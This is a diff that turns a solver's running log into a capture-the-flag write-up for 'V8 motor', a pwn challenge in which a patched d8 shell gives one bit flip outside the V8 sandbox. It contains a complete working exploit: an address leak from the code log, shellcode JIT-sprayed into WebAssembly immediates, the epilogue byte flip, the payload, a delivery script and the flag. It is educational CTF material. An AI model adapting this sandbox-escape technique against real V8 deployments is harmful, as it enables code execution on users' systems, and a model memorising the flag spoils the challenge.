@@ -1,126 +1,232 @@
 # V8 motor
 
-**Flag:** `TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}`
+`V8 motor` is a 500-point pwn (V8/JS engine) challenge from TFC CTF 2026, served
+over a dynamic netcat instance. The provided `d8` shell is patched with a single
+`bitFlip(object, bit_offset)` primitive that XORs one bit anywhere *outside* the
+V8 sandbox. Key idea: JIT-spray shellcode into a WebAssembly code page as
+`i64.const` immediates, flip one bit of the function epilogue's `pop rbp`
+(`0x5d`) into `jge` (`0x7d`), and ride the jump into the sprayed
+`execve("/rdflag")` shellcode.
 
-# V8 motor — running log
+## Recon
 
-Append-only. Timestamp every entry.
+The attachment is `motor_v8.zip`. Unpacking gives:
 
-## Hypotheses
-## Findings
-## Dead ends
-## Limitations
-## Next actions
+```
+d8                  # patched V8 shell, 49 MB, x64 release build
+bitflip.patch       # the vulnerability
+readflag.c          # SUID reader that prints /flag
+run.sh              # remote wrapper
+snapshot_blob.bin   # V8 snapshot
+flag, Dockerfile, args.gn
+```
 
-## Brief / category / skills / hypotheses
-PWN (V8/JS engine) — 272 pts — dynamic netcat — ~46 solves. Attach: motor_v8.zip.
-- Brief: 'the sun is a deadly laser'
-- Required skills: pwntools; v8/d8 (inside zip); type-confusion/OOB exploit -> wasm RWX -> shellcode.
-- First hypotheses: classic d8 challenge: abuse a JS type confusion / OOB array write, then WebAssembly RWX page for shellcode, read flag.
+`args.gn` shows a release x64 build (`is_debug = false`, `target_cpu = "x64"`).
+`Dockerfile` copies the flag to `/flag`, builds `readflag.c` into `/rdflag`
+(`chmod 4755`), and runs `socat ... EXEC:/challenge/run.sh` on port 1337.
+`run.sh` reads the exact payload length on the first line, then feeds exactly
+that many bytes to:
 
-## Discovery & ideation (2026-09-05)
-FILES: motor_v8.zip -> d8 (49MB, patched V8), bitflip.patch (the vuln), readflag.c (SUID: sets uid0, reads /flag to stdout), run.sh (reads exact-length JS payload, runs 'd8 --log-code --logfile=+'), snapshot_blob.bin, flag, Dockerfile, args.gn.
-bitflip.patch (full read): adds global bitFlip(object, bit_offset): flips ONE bit at object.address()+bit_offset/8, REJECTS if the target is inside the V8 sandbox (V8_ENABLE_SANDBOX). Also: 'os' global now always exposed BUT os.system removed; d8.wasm serialize helpers removed (Wasm itself still enabled).
-HYPOTHESES (ranked):
-1. Single-bit-flip sandbox escape via WebAssembly RWX: instantiate a wasm module whose code page lives OUTSIDE the sandbox (trusted space), then bitFlip one bit in that RWX code to turn a controlled instruction into shellcode (or corrupt a code entry/pointer), then call it -> execve('/challenge/readflag') (readflag is SUID and prints /flag). Classic bitflip-WASM RWX technique.
-2. bitFlip a bit in the isolate's external/trusted data (code pointer table, dispatch table) outside the sandbox to redirect to shellcode; then trigger.
-3. Note os.setenv/unsetenv etc. still available (no system) - not needed if we have RWX shellcode.
-NEXT: confirm the exact challenge setup (run d8 locally with a test bitFlip outside sandbox), then build the standard V8 sandbox-escape + wasm RWX shellcode exploit calling readflag. Read readflag path (run.sh uses /challenge/d8; readflag at /challenge/readflag presumably; verify via Dockerfile/args.gn).
+```
+timeout 90s /challenge/d8 --log-code --logfile=+ exp.js
+```
 
+`--log-code --logfile=+` writes a code-creation log to an anonymous `O_TMPFILE`
+(visible later through `/proc/self/fd/*`).
 
-## Deep analysis (2026-09-05 ~2026-09-05 19:02:19)
-Exploit chain established end-to-end:
-1. Leak wasm code addr + NativeModule addr + SFI via read('/proc/self/fd/3') (the --log-file O_TMPFILE is fd 3).
-2. bitFlip(obj, bit_offset) flips ONE bit at obj.address()+off/8, only OUTSIDE the V8 sandbox (cage=inside).
-3. Plan: embed execve("/rdflag") shellcode as i64.const immediates in Liftoff code; flip pop_rbp(0x5d)->jge(0x7d) at code+0xaa; jge lands on entry-jump in imm -> JIT-spray shellcode runs.
-4. Shellcode (JIT spray, even immediates only): push "lag"; push "/rdf"; mov rdi,rsp; xor esi/edx; push 59; pop rax; syscall. Chunks use eb 0c to skip movabs opcodes.
+The patch adds the single primitive:
 
-KEY FINDINGS / BLOCKERS:
-- PKU (Memory Protection Keys) ENABLED by default (--memory-protection-keys). wasm code page = pkey 1 = write-protected -> bitFlip faults SEGV_PKUERR. CodeRange pkey 1. Code pointer table also write-protected. So no writable executable memory; plain code-page flip only works with --no-memory-protection-keys.
-- Trusted space (partition_alloc, pkey 0) holds WasmCode.instructions_ = code_obj at FIXED offset meta-0x4f4e0. Flipping it does NOT redirect direct call (direct call uses code pointer table).
-- SFI->JSFunction offset FRAGILE: varies with parse-time string literals / GC. eval offset measured 0x2d114/0x2d240/0x2d260/0x2d274/0x206c across variants; 64MB ArrayBuffer stabilizes partially.
-- Tier budget: sub [r10],0xcd per call; 2nd call may tier-up (js) clobbering flags before jge.
+```c
+void Shell::BitFlip(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  static std::atomic_flag used = ATOMIC_FLAG_INIT;   // ONE use only
+  bool already_used = used.test_and_set();
+  ...
+  uint64_t bit_offset = static_cast<uint64_t>(offset_number);   // <= 2^53-1
+  i::Address target = object->address() + bit_offset / 8;
+#ifdef V8_ENABLE_SANDBOX
+  if (i_isolate->isolate_group()->sandbox()->Contains(target)) {
+    ThrowError(isolate, "invalid");   // reject sandbox-internal targets
+    return;
+  }
+#endif
+  auto* byte = reinterpret_cast<volatile uint8_t*>(target);
+  *byte ^= static_cast<uint8_t>(1u << (bit_offset % 8));
+}
+```
 
-NEXT:
-- Calibrate EXACT final script offset via gdb (break BitFlip+0x23f, read rax target vs log codeObj).
-- Verify syscall args.
-- Remote may lack PKU; try remote with plain jge flip.
+In the same patch, `os` is now exposed unconditionally but `os.system` is
+removed, and the `d8.wasm.serializeModule/deserializeModule` helpers are removed
+(WebAssembly itself stays enabled). `readflag.c` is a classic SUID reader:
+`setresuid(0)` then `open/read/write` of `/flag`.
 
+## Analysis
 
-## Remote verification + shellcode refinement (2026-09-05 19:51:54)
-- REMOTE HAS NO PKU: bitFlip on wasm code page succeeds ("FLIP OK"). Local droplet has PKU (SEGV_PKUERR), so all local logic tests use --no-memory-protection-keys.
-- Remote log file is fd 6 (not 3); exploit now scans /proc/self/fd/* for "v8-version".
-- 4x 64MB ArrayBuffer allocations before foo(1) STABILIZE the SFI->JSFunction offset (was common/rare 2-state; now deterministic). Offset calibrated via gdb breakpoint at BitFlip+0x23f reading $rax vs log codeObj.
-- jge flip (pop rbp 0x5d -> jge 0x7d at code+0xaa) reliably taken after the 4-GC stabilization (0 normal exits).
-- SHELLCODE BLOCKER: with i64.const->movabs (10-byte) chunks, executable slots are only the even/odd immediates; the string "/rdflag" cannot be built via push imm32 (sign-extends, breaks into "/rdf" + nulls). movabs+push (11 bytes) does not fit a single 8-byte chunk. LEA(7)+syscall(2)=9 bytes overflows the 8-byte last chunk by 1.
-- i32.const+i32.add emits 5-byte mov eax/add eax (4-byte immediates) - a usable shorter-chunk JIT spray; string setup still needs a 7-byte LEA.
+Observation: `bitFlip` gives exactly one bit XOR anywhere whose target address is
+*outside* the sandbox. WebAssembly code is compiled to a RWX page in trusted
+space (outside the sandbox cage), and Liftoff emits each wasm `i64.const` as
+`48 b8 <imm64>` (`movabs rax, imm64`) — so the 8-byte immediates are fully
+attacker-controlled bytes sitting in executable memory.
 
-FILES:
-- solve/exploit.js (remote payload, best effort)
-- extract/exploit_v9.js (local: 4-GC, offset 0x20e0, jge flip, movabs-string shellcode)
-- extract/exploit_final3/4.js (offset-calibrated local variants)
+Hypothesis (classic bitflip-wasm chain): embed shellcode in the immediates, then
+flip one bit of a `pop rbp` in the function epilogue to `jge` so the epilogue's
+final conditional jump redirects control into the sprayed immediates, and call
+the wasm function again.
 
-NEXT: solve the 1-byte shellcode fit (9-byte LEA+syscall into 8-byte last chunk) by putting syscall 0f 05 across the last chunk boundary using a 5-byte LEA variant or by placing the string in a wasm data segment and using mov rdi, imm (if low-address), OR use i32.const 5-byte chunks with 4-byte imm spray.
+Confirmation and key findings (from the solver's notes):
 
+1. **Log leak.** `read('/proc/self/fd/N')` on each fd finds the `--logfile=+`
+   temp file (it contains the string `v8-version`). The `code-creation` lines give
+   the wasm `codeObj` (field 4) and the eval'd function's `SFI` (field 7 of the
+   `code-creation,JS` line for `:1:10`). Local fd = 3, remote fd = 6 — hence the
+   fd scan.
+2. **PKU.** The remote has *no* Memory Protection Keys, so the wasm code page is
+   plain RWX and `bitFlip` succeeds. The local droplet has PKU enabled
+   (`SEGV_PKUERR` on the code page), so local tests run with
+   `--no-memory-protection-keys`.
+3. **SFI -> JSFunction offset.** The `foo` function object sits at
+   `sfi + 8244` (0x2034). Allocating 4x64MB `ArrayBuffer`s before the first call
+   GC-stabilizes the heap layout and makes this deterministic.
+4. **Immediate dedup shifts the epilogue.** Liftoff dedups identical `i64.const`
+   immediates: the duplicate is emitted as a 7-byte RIP-relative
+   `mov rax,[rip+disp]` instead of a 10-byte `movabs`. With `imm4 == imm11`
+   (both `0x9090909090909090`), the epilogue `pop rbp` lands at `code+0xa7`
+   (not `0xaa` as the un-deduped layout would place it).
+5. **The flip.** Flip bit 5 of the byte at `codeObj + 0xa7`: `0x5d` (`pop rbp`)
+   -> `0x7d` (`jge`). The `jge` is taken (the tiering epilogue leaves `SF==OF`)
+   and lands at `code+0x6c` = `imm8[1]` (a `nop`), i.e. inside the sprayed
+   immediates.
 
-## Shellcode string-build analysis (2026-09-05 19:56:12)
-- push imm32 sign-extends to 8 bytes, so two 4-byte pushes give "/rdf" + 4 nulls + "lag" + 4 nulls (string broken at byte 4).
-- Fix options: mov dword [rsp+4], 0x0067616c (8 bytes) must be contiguous in one 8-byte chunk, but then mov rdi/rest has no room after it.
-- i64.const->movabs is 10 bytes (opcode 2 + imm 8); executable slots are imm0 only (natural flow) or 6-byte chunks (eb 02 skip-opcode trick). LEA(7)+syscall(2)=9 bytes overflows the 8-byte last chunk by 1.
-- i32.const->mov eax,imm32 (5 bytes) gives 4-byte immediates; can set eax="lag" via b8 imm, but 4-byte chunks are too small for LEA/syscall.
-- eb 03 trick can skip chunk[0] giving 7 bytes for LEA in last chunk, but syscall still needs 2 more bytes after it.
+Techniques: **V8 sandbox escape via a single out-of-sandbox bit flip**, **wasm
+RWX JIT spray** (shellcode in `i64.const` immediates), and **instruction
+flip** (`pop rbp` -> `jge`) to redirect control flow.
 
-STATUS: remote exploit chain fully verified except the final execve shellcode string; ~95% complete.
+## Exploit
 
+The wasm function body is a chain of `i64.const`/`drop` statements; Liftoff
+emits `movabs rax, imm64` for each, so the immediates are the JIT-spray slots.
+Decoded immediates (little-endian bytes -> x86):
 
-## Final status (2026-09-05 20:00:45)
-RESULT: NOT SOLVED YET. Exploit ~95% complete.
+```
+imm1  2f 72 64 66 6c 61 67 00   "/rdflag\0"          <- data, at code+0x25
+imm4  90 90 90 90 90 90 90 90   nop sled               (== imm11, dedup'd)
+imm8  90 90 90 90 31 d2 eb 02   nop;nop;nop;nop; xor edx,edx; jmp +2
+imm9  48 83 c7 1d 31 f6 eb 02   add rdi,0x1d; xor esi,esi; jmp +2
+imm10 6a 3b 58 0f 05 90 eb 02   push 59; pop rax; syscall; nop; jmp +2
+imm11 90 90 90 90 90 90 90 90   nop sled               (== imm4, dedup'd)
+final i32.const 0x100000        return-value oracle (calibration)
+```
 
-WORKING (verified locally + remotely):
-1. Log leak: scan /proc/self/fd/* for the v8.log O_TMPFILE (fd 6 remote, fd 3 local). Gives wasm codeObj (field 4), NativeModule (field 7), SFI (field 7 of eval JS event).
-2. Remote has NO PKU: bitFlip on wasm code page succeeds ("FLIP OK"); local droplet has PKU (SEGV_PKUERR) so local tests use --no-memory-protection-keys.
-3. SFI->JSFunction offset stabilized with 4x 64MB ArrayBuffer before foo(1); calibrated via gdb (break BitFlip+0x23f, read $rax vs log codeObj). Local offset ~0x20d4-0x20e0.
-4. jge flip (pop rbp 0x5d -> jge 0x7d at code+0xaa, bit 5) reliably redirects into the JIT-sprayed immediates.
+The `eb 02` short jumps skip the fixed `48 b8` (`movabs`) opcode that precedes
+each immediate, stitching the 8-byte immediates into one instruction stream.
+At shellcode entry the register state is `rdi = codeObj + 8` and `rdx = 0`, so
+`add rdi, 0x1d` makes `rdi = codeObj + 0x25` — exactly the `"/rdflag\0"` string
+in `imm1`.
 
-BLOCKER (shellcode string layout):
-- i64.const -> movabs is 10 bytes (48 b8 + 8-byte imm). Natural flow only executes imm0 (8B); eb 0c/eb 02 jumps give 6-byte chunks. Last chunk is 8 bytes.
-- Need execve("/rdflag"): LEA rdi,[rip+disp] (7B) + syscall 0f 05 (2B) = 9 bytes > 8-byte chunk.
-- push imm32 sign-extends (4 value + 4 nulls), so two pushes give "/rdf" + nulls + "lag" (string broken at byte 4).
-- mov dword [rsp+4],imm32 fix is 8 bytes and must be contiguous in one chunk, leaving no room after it.
-- eb 03 trick gives 7 contiguous bytes (skip chunk[0]) = exactly LEA, but syscall still needs 2 more bytes.
+Execution once the `jge` lands at `code+0x6c` (`imm8[1]`):
 
-NEXT ATTEMPTS (in priority order):
-1. Check register state at shellcode entry (if rsi=rdx=0 already, shellcode shrinks to mov rdi,rsp(3)+push59/poprax(3)+syscall(2)=8B; need string at rsp via loop or a data imm + short pointer).
-2. Flip a bit in an existing cmovne (0f 45 -> 0f 05 syscall) if Liftoff emits one, with wasm code pre-setting rax/rdi/rsi/rdx.
-3. Read /proc/self/maps another way (readbuffer returns 0 too) to find code pointer table entry (writable on remote) and flip it to redirect to codeObj+2^k where a full shellcode sits.
+```
+90 90 90                    ; nops (imm8[1..3])
+31 d2                       ; xor edx, edx
+eb 02                       ; skip imm9's "48 b8"
+48 83 c7 1d                 ; add rdi, 0x1d   -> rdi = "/rdflag"
+31 f6                       ; xor esi, esi
+eb 02                       ; skip imm10's "48 b8"
+6a 3b 58                    ; push 59; pop rax
+0f 05                       ; syscall        -> execve("/rdflag", NULL, NULL)
+90 eb 02                    ; nop; jmp +2 (into imm11 nops)
+```
 
-Artifacts: solve/exploit.js (best payload), extract/exploit_v9.js (local test), notes in this file.
+**1. Compute the bit offset and flip.**
 
+```javascript
+const objAddr = sfi + 8244;                    // JSFunction address of foo
+const bitOffset = (codeObj + 167 - objAddr) * 8 + 5;
+bitFlip(foo, bitOffset);
+```
 
-## Parent hint application + final state (2026-09-05 20:10:03)
-Parent suggested: (A) string via mov rdi,imm64 + push, (B) cmovne->syscall single flip.
-Analysis: Liftoff only emits movabs rax (48 b8), not mov rdi (48 bf). The 48 b8 movabs executes in the natural flow (imm0 -> movabs1 -> movabs2 -> ...), but there is NO executable slot after movabs1 for push rax (next slot is the fixed movabs2 opcode). eb-jumps skip movabs; a 10-byte mov rdi,imm64 cannot span 8-byte immediates without the fixed movabs opcode breaking it. cmovne->syscall (0f45->0f05 via bit6) is valid but the one bitFlip would then be consumed, leaving no redirect (jge) into the sprayed shellcode; and the natural Liftoff code cannot express push/mov rdi/syscall as wasm ops.
-Conclusion: JIT-spray string building is the remaining 5% blocker. All other primitives verified end-to-end.
+`bitFlip` resolves `target = foo.address() + bitOffset/8 = codeObj + 167`
+(`0xa7`), outside the sandbox, and flips bit 5 (`0x5d ^ 0x20 = 0x7d`).
 
+**2. Call `main()` again to trigger the redirected shellcode.**
 
-## SOLVED (2026-09-05T22:16:35Z)
-Flag: TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a} (submitted ok:true).
+The second `inst.exports.main()` re-enters the wasm function; its epilogue now
+executes the flipped `jge`, which jumps into the sprayed immediates and runs
+`execve("/rdflag", NULL, NULL)`. `/rdflag` is SUID and prints `/flag`.
 
-Final exploit: solve/exploit_solved.js (also payload.js).
+Final remote payload (`solve/exploit_solved.js`):
 
-Key corrections vs prior worker:
-1. Liftoff dedups identical i64.const immediates: identical values become 7-byte RIP-relative
-   `mov rax,[rip+disp]` instead of 10-byte movabs. This shifts the tiering epilogue.
-   With imm11 == imm4 (both 0x9090909090909090), pop rbp lands at code+0xa7 (NOT 0xaa),
-   and the jge landing is code+0x6c (imm8[1], a nop).
-2. The flip offset must therefore be 167 (0xa7), not 170 (0xaa).
-3. SFI->JSFunction offset (remote, fd-scan structure, 180-byte wasm body) = 0x2034 (8244).
-   Measured remotely via the return-value oracle: set the function return to
-   i32.const 0x100000 (LEB 4) so the four bytes of the final `mov eax,0x100000`
-   immediate flip to four DISTINCT return values (1048608/1056768/3145728/537919488),
-   pinpointing the exact byte hit and thus the offset.
-4. Shellcode (works with rdi=codeObj+8, rdx=0):
-   landing: 31 d2 (xor edx,edx); eb 02
-   imm9:    48 83 c7 1d (add rdi,0x1d -> rdi = code+0x25 = "/rdflag\0" at imm1); 31 f6 (xor esi); eb 02
-   imm10:   6a 3b 58 (push 59; pop rax); 0f 05 (syscall); 90; eb 02
-   execve("/rdflag", NULL, NULL) = 59.
+```javascript
+var foo = (0, eval)("(function(a){return a+1;})");
+for (let i = 0; i < 4; i++) new ArrayBuffer(64 * 1024 * 1024);
+const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,148,1,1,145,1,0,66,177,236,199,145,141,146,164,200,144,127,26,66,175,228,145,179,198,173,216,51,26,66,208,144,165,188,142,146,164,200,144,127,26,66,179,230,204,153,179,230,204,153,51,26,66,144,161,194,132,137,146,164,200,144,127,26,66,196,136,145,162,196,136,145,162,196,0,26,66,234,246,224,250,208,128,164,200,144,127,26,66,213,170,213,170,213,170,213,170,213,0,26,66,144,161,194,132,153,198,244,245,2,26,66,200,134,158,238,145,198,253,245,2,26,66,234,246,224,250,208,128,228,245,2,26,66,144,161,194,132,137,146,164,200,144,127,26,65,128,128,192,0,11]);
+const mod = new WebAssembly.Module(wasmCode);
+const inst = new WebAssembly.Instance(mod);
+inst.exports.main();
+foo(1);
+let logfd = -1;
+for (let fd = 0; fd < 16; fd++) { try { if (read('/proc/self/fd/' + fd).indexOf('v8-version') !== -1) { logfd = fd; break; } } catch(e) {} }
+let codeObj = null, sfi = null;
+for (let tries = 0; tries < 2000; tries++) {
+  let lines = []; try { lines = read('/proc/self/fd/' + logfd).split('\n'); } catch(e) {}
+  for (const l of lines) {
+    if (l.startsWith('code-creation') && l.indexOf('wasm-function') !== -1) { codeObj = parseInt(l.split(',')[4], 16); }
+    if (l.startsWith('code-creation,JS') && l.indexOf(':1:10') !== -1) { sfi = parseInt(l.split(',')[7], 16); }
+  }
+  if (codeObj !== null && sfi !== null) break;
+}
+const objAddr = sfi + 8244;
+const bitOffset = (codeObj + 167 - objAddr) * 8 + 5;
+if (bitOffset < 0 || bitOffset > 9007199254740991) {
+  print('UNREACHABLE');
+} else {
+  bitFlip(foo, bitOffset);
+  inst.exports.main();
+}
+```
+
+**3. Deliver it.**
+
+`run.sh` expects the exact byte length first, then the payload:
+
+```
+$ ncat --ssl <deployment>.challs.ctf.thefewchosen.com 1337
+<len(payload)>
+<payload bytes>
+TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}
+```
+
+## Full chain
+
+1. Save the payload above as `exp.js`.
+2. Send its exact length, then its bytes, to the netcat service:
+
+```
+python3 - <<'EOF'
+import socket, ssl
+payload = open('exp.js','rb').read()
+s = ssl.wrap_socket(socket.create_connection(('<deployment>.challs.ctf.thefewchosen.com', 1337)))
+s.sendall(str(len(payload)).encode() + b'\n' + payload)
+print(s.recv(4096).decode(errors='replace'))
+EOF
+```
+
+The wasm function is instantiated, `main()` runs once to populate the log, the
+log is scanned for `codeObj` + `sfi`, `bitFlip` flips the epilogue `pop rbp`
+byte, and the second `main()` call runs the sprayed `execve("/rdflag")`.
+
+## Flag
+
+`TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}`
+
+## Lessons
+
+- A single *out-of-sandbox* bit flip plus a RWX wasm code page is a complete V8
+  sandbox escape: use `i64.const` immediates as a JIT spray and flip a nearby
+  conditional-jump byte (`pop rbp 0x5d` -> `jge 0x7d`) to redirect into it.
+- Identical immediates get deduplicated into shorter RIP-relative loads, which
+  shifts every later instruction in the function — always re-derive the flip
+  offset from the final byte layout (and the return-value oracle) instead of
+  reusing an earlier variant's offset.
+- `--log-code --logfile=+` is itself an information leak: the `code-creation`
+  log is reachable through `/proc/self/fd/*`, giving code-object and SFI
+  addresses without any extra bug.
